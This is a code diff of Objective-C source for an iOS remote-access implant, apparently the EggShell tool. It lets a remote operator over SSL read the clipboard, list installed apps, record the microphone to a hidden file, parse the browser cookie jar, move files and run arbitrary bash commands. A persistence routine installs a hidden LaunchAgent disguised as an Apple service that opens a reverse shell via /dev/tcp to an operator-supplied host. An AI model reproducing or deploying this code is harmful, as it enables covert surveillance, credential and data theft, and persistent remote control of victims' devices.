+    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
+    int processID = [processInfo processIdentifier];
+    [self sendString:[NSString stringWithFormat:@"%d",processID]];
+    [self term];
+}
+
+
+-(void)getPasteBoard {
+    UIPasteboard *pb  = [UIPasteboard generalPasteboard];
+    NSString *contents = pb.string;
+    if (contents == nil) {
+        [self sendString:@"nil"];
+    }
+    [self sendString:contents];
+    [self term];
+}
+
+
+-(void)getBattery {
+    int batinfo=([_thisUIDevice batteryLevel]*100);
+    [self sendString:[NSString stringWithFormat:@"Battery Level: %d ",batinfo]];
+    [self term];
+}
+
+
+-(void)getVolume {
+    //TODO: fix this from pausing
+    [[AVAudioSession sharedInstance] setActive:YES error:nil];
+    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
+    [self sendString:[NSString stringWithFormat:@"%.2f",[AVAudioSession sharedInstance].outputVolume]];    
+    [self term];
+}
+
+
+-(void)setVolume:(NSString *)args {
+    MPVolumeView* volumeView = [[MPVolumeView alloc] init];
+    //find the volumeSlider
+    UISlider* volumeViewSlider = nil;
+    for (UIView *view in [volumeView subviews]){
+        if ([view.class.description isEqualToString:@"MPVolumeSlider"]){
+            volumeViewSlider = (UISlider*)view;
+            break;
+        }
+    }
+    [volumeViewSlider setValue:[args floatValue] animated:YES];
+    [volumeViewSlider sendActionsForControlEvents:UIControlEventTouchUpInside];
+    [self term];
+}
+
+
+-(void)vibrate {
+    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
+    [self term];
+}
+
+
+-(void)bundleIds {
+    NSString *result = @"";
+    char buf[1024];
+    CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
+    CFIndex i;
+    for(i = 0; i < CFArrayGetCount(ary); i++) {
+        CFStringGetCString(CFArrayGetValueAtIndex(ary, i),buf, sizeof(buf), kCFStringEncodingUTF8);
+        result = [NSString stringWithFormat:@"%@%s\n",result,buf];
+        printf("%s\n", buf);
+    }
+    [self sendString:result];
+    [self term];
+}
+
+
+-(void)screenshot {
+   UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
+   NSData *imageData = UIImagePNGRepresentation(image);
+   [self debugLog:[NSString stringWithFormat:@"%@",imageData]];
+   [self term];
+}
+
+    
+-(void)ipod:(NSString *)args {
+    if ([args isEqualToString:@"play"]) {
+        [[MPMusicPlayerController systemMusicPlayer] play];
+    } else if ([args isEqualToString:@"pause"]) {
+        [[MPMusicPlayerController systemMusicPlayer] pause];
+    } else if ([args isEqualToString:@"next"]) {
+        [[MPMusicPlayerController systemMusicPlayer] skipToNextItem];
+    } else if ([args isEqualToString:@"prev"]) {
+        [[MPMusicPlayerController systemMusicPlayer] skipToPreviousItem];
+    } else if ([args isEqualToString:@"info"]) {
+        float time1 = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
+        [NSThread sleepForTimeInterval:0.1];
+        float time2 = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
+        if (time1 != time2) {
+            MPMediaItem *song = [[MPMusicPlayerController systemMusicPlayer] nowPlayingItem];
+            NSString * title   = [song valueForProperty:MPMediaItemPropertyTitle];
+            NSString * album   = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
+            NSString * artist  = [song valueForProperty:MPMediaItemPropertyArtist];
+            NSString *mpstatus = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f\n",title,album,artist,time2];
+            [self sendString:mpstatus];
+        } else {
+            [self sendString:@"Not Playing"];
+        }
+    }
+    [self term];
+}
+
+
+-(void)openApp:(NSString *)arg {
+    CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [arg UTF8String], kCFStringEncodingUTF8);
+    assert(identifier != NULL);
+    int ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
+    if (ret != 0) {
+        [self sendString:@"Cannot open app, is device locked?"];
+    }
+    CFRelease(identifier);
+    [self term];
+}
+
+
+-(void)say:(NSString *)string {
+    AVSpeechUtterance *utterance = [AVSpeechUtterance speechUtteranceWithString:string];
+    utterance.rate = 0.4;
+    AVSpeechSynthesizer *syn = [[[AVSpeechSynthesizer alloc] init]autorelease];
+    [syn speakUtterance:utterance];
+    [self term];
+}
+
+
+-(void)getProcessId {
+    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
+    int processID = [processInfo processIdentifier];
+    [self sendString:[NSString stringWithFormat:@"%d",processID]];
+    [self term];
+}
+
+
+-(void)sysinfo {
+    UIDevice *device = [UIDevice currentDevice];
+    int batinfo=([_thisUIDevice batteryLevel]*100);
+    NSString *info = [NSString stringWithFormat:@"Model: %@\nBattery: %d\nSystem Version: %@ %@\nDevice Name: %@\nUUID: %@\n",
+                      [device model],
+                      batinfo,
+                      [device systemName],
+                      [device systemVersion],
+                      [device name],
+                      [[device identifierForVendor] UUIDString]];
+    [self sendString:info];
+    [self term];
+}
+
+
+-(void)mic:(NSString *)arg {
+    if ([arg isEqualToString:@"record"]) {
+        NSError *initMicError = nil;
+        [self initmic:initMicError];
+        if (initMicError) {
+            [self sendString:initMicError.localizedDescription];
+        } else {
+            NSString *file = @"/tmp/.avatmp";
+            [self.fileManager removeItemAtPath:file error:NULL];
+            [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
+            
+            NSString *destinationString = file;
+            NSURL *destinationURL = [NSURL fileURLWithPath: destinationString];
+            NSDictionary *mysettings = @{AVFormatIDKey: @(kAudioFormatMPEG4AAC),
+                                         AVEncoderAudioQualityKey: @(AVAudioQualityHigh),
+                                         AVNumberOfChannelsKey: @1,
+                                         AVSampleRateKey: @22050.0f};
+            [[AVAudioSession sharedInstance] setActive:YES error:nil];
+            self.audioRecorder = [[AVAudioRecorder alloc] initWithURL:destinationURL settings:mysettings error:nil];
+            self.audioRecorder.meteringEnabled = true;
+            self.audioRecorder.delegate = self;
+            
+            [self.audioRecorder prepareToRecord];
+            [self.audioRecorder record];
+            [self sendString:@"Listening..."];
+        }
+    } else if ([arg isEqualToString:@"stop"]) {
+        if ([self.audioRecorder isRecording]) {
+            [self.audioRecorder stop];
+            //send confirmation
+            [self sendString:@"{\"status\":1}"];
+            } else {
+            [self sendString:@"{\"error\":\"Not currently recording\"}"];
+        }
+    }
+    [self term];
+}
+
+
+-(void)initmic:(NSError *)error {
+    NSURL *soundFile;
+    NSDictionary *soundSetting;
+    soundFile = [NSURL fileURLWithPath: @"/tmp/.avatmp"];
+    soundSetting = [NSDictionary dictionaryWithObjectsAndKeys:
+                    [NSNumber numberWithFloat: 44100.0],AVSampleRateKey,
+                    [NSNumber numberWithInt: kAudioFormatMPEG4AAC],AVFormatIDKey,
+                    [NSNumber numberWithInt: 2],AVNumberOfChannelsKey,
+                    [NSNumber numberWithInt: AVAudioQualityHigh],AVEncoderAudioQualityKey, nil];
+    self.audioRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: &error];
+}
+
+    
+-(AVCaptureDevice *)initcamera:(bool)front {
+    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
+    AVCaptureDevice *captureDevice = nil;
+    for (AVCaptureDevice *device in videoDevices){
+        if (device.position == AVCaptureDevicePositionFront){
+            captureDevice = device;
+            break;
+        }
+    }
+    return captureDevice;
+}
+
+//MARK: Data Handling
+char lastBytes[64];
+char* parseBinary(int* searchChars,int sizeOfSearch) {
+    NSString *cookieJarPath = [NSString stringWithFormat:@"%@/Library/Cookies/Cookies.binarycookies",NSHomeDirectory()];
+    FILE *cookieJar = fopen([cookieJarPath UTF8String], "rb+");
+    fseek(cookieJar, 0L, SEEK_END);
+    long cookieJarSize = ftell(cookieJar);
+    int pos = 0; int curSearch = 0;int curChar;
+    fseek(cookieJar, 0, 0);
+    
+    while(pos <= cookieJarSize) {
+        curChar = getc(cookieJar);pos++;
+        
+        if(curChar == searchChars[curSearch]) { /* found a match */
+            curSearch++;                        /* search for next char */
+            if(curSearch > sizeOfSearch - 1) {                 /* found the whole string! */
+                curSearch = 0;                  /* start searching again */
+                fread(lastBytes,1,64,cookieJar); /* read 5 bytes */
+                return lastBytes;
+            }
+            
+        } else { /* didn't find a match */
+            if (curSearch > 18) {
+                printf("fuck %d\n",searchChars[curSearch]);
+            }
+            curSearch = 0;                     /* go back to searching for first char */
+        }
+    };
+    return "null";
+}
+
+
+-(void)sendFile:(NSString *)path {
+    BOOL isDir;
+    if ([self.fileManager fileExistsAtPath:path isDirectory:&isDir]) {
+        if (isDir) {
+            [self sendString:@"{\"status\":2}"];
+            [self term];
+        } else {
+            NSData *data = [self.fileManager contentsAtPath:path];
+            NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
+            [result setValue:[NSNumber numberWithInt:(int)data.length] forKey:@"size"];
+            [result setValue:[NSNumber numberWithInt:1] forKey:@"status"];
+            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
+            [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
+            [self term];
+            [self sendData:data];
+        }
+    } else {
+        [self sendString:@"{\"status\":0}"];
+        [self term];
     }
 }
 
--(void)mcSendNoReply:(NSString *)command {
-    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
-    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo]) {
-        [self blank];
+
+-(void)sendData:(NSData *)data {
+    NSString *end = [self receiveString:10];
+    SSL_write(client_ssl, [data bytes], (int)data.length);
+    SSL_write(client_ssl, [end UTF8String], (int)end.length);
+}
+
+
+-(void)receiveFile:(NSString *)args {
+    NSData *jsonData = [args dataUsingEncoding:NSUTF8StringEncoding];
+    NSMutableDictionary *uploadargs = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
+    long size = [[uploadargs valueForKey:@"size"] integerValue];
+    NSString *uploadPath = [NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"path"]];
+    NSString *fileName = [NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"filename"]];
+    NSData *data = [self receiveData:size];
+    [data writeToFile:[NSString stringWithFormat:@"%@/%@",uploadPath,fileName] atomically:true];
+}
+
+
+-(NSData *)receiveData:(long)size {
+    NSMutableData *data = [NSMutableData alloc];
+    char buffer[1024] = "";
+    while (SSL_read(client_ssl, &buffer, sizeof(buffer))) {
+        [data appendBytes:buffer length:sizeof(buffer)];
+        if (strstr(buffer,terminator)) {
+            break;
+        }
+        memset(buffer,'\0',1024);
+    };
+    [self debugLog:[NSString stringWithFormat:@"data size = %lu",(unsigned long)[data subdataWithRange:NSMakeRange(0, size)].length]];
+    return [data subdataWithRange:NSMakeRange(0, size)];
+}
+
+
+//MARK: Navigation
+-(void)changeDirectory:(NSString *)dir {
+    NSString *path = NSHomeDirectory();
+    if (![dir isEqual: @""]) {
+        path = dir;
+    }
+    BOOL isdir = false;
+    if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
+        if (isdir) {
+            [fileManager changeCurrentDirectoryPath:path];
+        }
+        else {
+            [self sendString:[NSString stringWithFormat:@"%@: Not a directory\n",path]];
+        }
     }
     else {
-        [self sendString:@"You dont have eggshellPro Extension"];
+        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory\n",path]];
+    }
+    [self term];
+}
+
+
+-(void)killTask {
+    if (sysTaskRunning) {
+        sysTaskRunning = false;
+        [_systask terminate];
+    }
+    [self term];
+}
+
+
+-(void)runTask:(NSString *)cmd :(bool)sendTerm {
+    if (sysTaskRunning) {
+        //if sys task is running, write to stdin filehandle
+        [stdinPipe.fileHandleForWriting writeData:[cmd dataUsingEncoding:NSUTF8StringEncoding]];
+    } else {
+            //dispatch to allow future killswitch
+            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
+                //split cmd by ";" run each separately (this isn't ideal - while true; do echo smh; done)
+                NSArray *cmdArray = [cmd componentsSeparatedByString:@";"];
+                NSEnumerator *e = [cmdArray objectEnumerator];
+                id object;
+                sysTaskRunning = true;
+                while ((object = [e nextObject]) && sysTaskRunning) {
+                    NSLog(@"running task %@",object);
+                    _systask = [[NSTask alloc] init];
+                    [_systask setLaunchPath:@"/bin/bash"];
+                    [_systask setArguments:@[ @"-c", object]];
+                    [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
+                    
+                    NSPipe *stdoutPipe = [NSPipe pipe];
+                    stdinPipe = [NSPipe pipe];
+                    [_systask setStandardInput:stdinPipe];
+                    [_systask setStandardOutput:stdoutPipe];
+                    [_systask setStandardError:stdoutPipe];
+                    NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
+                    [stdoutHandle waitForDataInBackgroundAndNotify];
+                    id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
+                                                                                    object:stdoutHandle queue:nil
+                                                                                usingBlock:^(NSNotification *note)
+                                   {
+                                       NSData *dataRead;
+                                       while((dataRead = [stdoutHandle availableData]) && dataRead.length > 0) {
+                                           NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
+                                           [self sendString:newOutput];
+                                       }
+                                       [stdoutHandle waitForDataInBackgroundAndNotify];
+                                   }];
+                    [_systask launch];
+                    [_systask waitUntilExit];
+                    [[NSNotificationCenter defaultCenter] removeObserver:observer];
+                }
+                if (sysTaskRunning) {
+                    if (sendTerm) {
+                        [self term];
+                    }
+                    sysTaskRunning = false;
+                }
+            });
     }
 }
 
--(void)mcSendYesReply:(NSString *)command {
+
+-(void)rocketMC:(NSString *)command {
+    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
+    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo] == false) {
+        [self sendString:@"You dont have eggshellPro Extension"];
+    }
+    [self term];
+}
+
+
+-(void)rocketMCWithReply:(NSString *)command {
     NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
     NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply" userInfo:userInfo];
     NSString *replystr = [reply objectForKey:@"returnStatus"];
     [self sendString:replystr];
+    [self term];
 }
 
--(void)locationService:(NSString *)arg {
-    NSString *howto = @"Usage example: locationservice off/locationservice on";
-    if ([arg isEqualToString: @"on"]) {
-        [self mcSendNoReply:@"locationon"];
-    }
-    else if ([arg isEqualToString: @"off"]) {
-        [self mcSendNoReply:@"locationoff"];
-    }
-    else {
-        [self sendString:howto];
-    }
-
+    
+-(void)debugLog:(NSString *)string {
+    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:@"/tmp/esplog"];
+    [fileHandle seekToEndOfFile];
+    [fileHandle writeData:[string dataUsingEncoding:NSUTF8StringEncoding]];
+    [fileHandle closeFile];
 }
 
+
+-(void)persistence:(NSString *)args :(NSString *)ip :(int)port {
+    NSString *esplPath = @"/Library/LaunchAgents/.espl.plist";
+    if ([args isEqualToString:@"install"]) {
+        NSDictionary *innerDict = [NSDictionary dictionaryWithObjects:
+                        [NSArray arrayWithObjects: [NSNumber numberWithBool: YES],@"com.apple.espl",[NSNumber numberWithInt:5],[NSNumber numberWithBool: YES],
+                         [NSArray arrayWithObjects:@"sh",@"-c",[NSString stringWithFormat:@"bash &> /dev/tcp/%@/%d 0>&1",ip,port], nil], nil]
+                        forKeys:[NSArray arrayWithObjects:@"AbandonProcessGroup",@"Label",@"StartInterval",@"RunAtLoad",@"ProgramArguments", nil]];
+        NSError *err = nil;
+        NSData *plistData = [NSPropertyListSerialization dataWithPropertyList:innerDict format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
+        if (err != nil) {
+            [self debugLog:[NSString stringWithFormat:@"persistence error>%@<\n",err]];
+            [self sendString:@"error"];
+            [self term];
+            return;
+        }
+        [plistData writeToFile:esplPath atomically:true];
+        [self runTask:@"sleep 1;launchctl unload /Library/LaunchAgents/.espl.plist 2>/dev/null;;launchctl load /Library/LaunchAgents/.espl.plist 2>/dev/null;":false];
+    } else if ([args isEqualToString:@"uninstall"]) {
+        if ([self.fileManager fileExistsAtPath:esplPath]) {
+            [self runTask:@"launchctl unload /Library/LaunchAgents/.espl.plist 2>/dev/null; rm /Library/LaunchAgents/.espl.plist 2>/dev/null;":false];
+        }
+    } else {
+        [self sendString:@"Unknown Option"];
+    }
+    [self term];
+}
+
+
+
+-(void)term {
+    SSL_write(client_ssl, terminator, (int)strlen(terminator));
+}
+
+
+-(void)sendString:(NSString *)str {
+    SSL_write(client_ssl, [str UTF8String], (int)str.length);
+}
+
+
+-(NSString *)receiveString:(int)length {
+    char buffer[length];
+    SSL_read(client_ssl, &buffer, length + 1);
+    NSString *result = [NSString stringWithFormat:@"%s",buffer];
+    memset(buffer,'\0',length);
+    return result;
+}
 
 @end
